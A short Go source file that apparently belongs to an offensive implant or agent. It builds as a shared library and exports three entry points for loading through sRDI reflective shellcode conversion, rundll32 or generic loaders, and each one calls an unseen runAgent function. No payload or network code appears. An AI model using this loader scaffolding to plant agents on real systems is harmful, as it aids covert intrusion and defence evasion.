//go:build shared
// +build shared

package main

import "C"
import (
	"unsafe"
)

// These exported functions are only compiled when building with -buildmode=c-shared

//export Run
func Run() {
	// Primary entry point for sRDI shellcode conversion
	// This is called by the reflective loader after DllMain
	runAgent()
}

//export Fire
func Fire(hwnd, hinst, lpszCmdLine unsafe.Pointer, nCmdShow int) {
	// Primary entry point for rundll32
	// Matches rundll32's expected signature: void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
	runAgent()
}

//export VoidFunc
func VoidFunc() {
	// Generic export for loaders that don't use rundll32 signature
	runAgent()
}
